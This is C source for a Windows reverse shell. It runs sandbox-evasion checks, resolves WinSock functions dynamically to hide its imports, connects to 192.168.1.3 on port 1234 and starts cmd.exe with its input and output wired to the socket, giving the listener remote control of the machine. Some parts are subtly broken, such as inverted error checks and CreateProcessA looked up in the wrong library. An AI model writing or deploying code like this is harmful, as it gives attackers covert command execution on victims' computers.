#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <unistd.h>
#include "gyat.h"

typedef INT(WINAPI * PWSAStartup) (
  WORD,
  LPWSADATA
);

typedef SOCKET(WSAAPI * PWSASocketA) (
  int,
  int,
  int,
  LPWSAPROTOCOL_INFOA,
  GROUP,
  DWORD
);

typedef INT(WSAAPI * PWSAConnect) (
  SOCKET,
  const struct sockaddr *,
  int, 
  LPWSABUF,
  LPWSABUF, 
  LPQOS,
  LPQOS
);

typedef BOOL(WINAPI * PCreateProcessA) (
  LPCSTR,
  LPSTR,
  LPSECURITY_ATTRIBUTES,
  LPSECURITY_ATTRIBUTES,
  BOOL,
  DWORD,
  LPVOID,
  LPCSTR,
  LPSTARTUPINFOA,
  LPPROCESS_INFORMATION
);

int main() {
  busy_sleep          ();
  check_cpu_count     ();
  check_computer_name ();
  check_username      ();

  HMODULE Handle_Kernel32 = GetModuleHandleW (L"kernel32.dll");
  HMODULE Handle_WS2      = LoadLibraryW     (L"ws2_32.dll");

  PWSAStartup      urmom_wsastartup     = (PWSAStartup)      GetProcAddress  (Handle_WS2,       "WSAStartup");
  PWSASocketA      urmom_wsasocketa     = (PWSASocketA)      GetProcAddress  (Handle_WS2,       "WSASocketA");
  PWSAConnect      urmom_wsaconnect     = (PWSAConnect)      GetProcAddress  (Handle_WS2,       "WSAConnect");
  PCreateProcessA  urmom_createprocessa = (PCreateProcessA)  GetProcAddress  (Handle_WS2,   "CreateProcessA");
  
  int    port       = 1234;
  char * ip_address = "192.168.1.3";

  WSADATA                             wsd;
  SOCKET                   windows_socket;
  struct sockaddr_in       socket_address;
  STARTUPINFO         startup_information;
  PROCESS_INFORMATION process_information;

  if (urmom_wsastartup(MAKEWORD(2,2), &wsd) == 0) {
    printf("Error M1: %lu\n", WSAGetLastError());
  }

  windows_socket = WSASocket(
    AF_INET,      // IPv4
    SOCK_STREAM,  // TCP
    IPPROTO_TCP,  // TCP
    NULL,
    0,
    0
  );

  if (windows_socket == INVALID_SOCKET) {
    printf("Error M2: %lu\n", WSAGetLastError());
  }

  socket_address.sin_family       = AF_INET;
  socket_address.sin_port         = htons(port);
  socket_address.sin_addr.s_addr  = inet_addr(ip_address);

  if (urmom_wsaconnect(
    windows_socket,
    (SOCKADDR * )&socket_address,
    sizeof(socket_address),
    NULL,
    NULL,
    NULL,
    NULL
    ) == 0)

  {
    printf("Error M3: %lu\n", WSAGetLastError());
  } 

  memset(&startup_information, 0, sizeof(startup_information));
  
  startup_information.cb         = sizeof(startup_information);
  startup_information.dwFlags    =        STARTF_USESTDHANDLES;
  startup_information.hStdInput  =      (HANDLE)windows_socket;
  startup_information.hStdOutput =      (HANDLE)windows_socket;
  startup_information.hStdError  =      (HANDLE)windows_socket;

  if (!CreateProcessA(
    NULL,
    "cmd.exe",
    NULL,
    NULL,
    TRUE,
    0,
    NULL,
    NULL,
    &startup_information,
    &process_information
    ))
    
  {
    printf("Error M4: %lu\n", GetLastError());
  }

  return EXIT_SUCCESS;
}
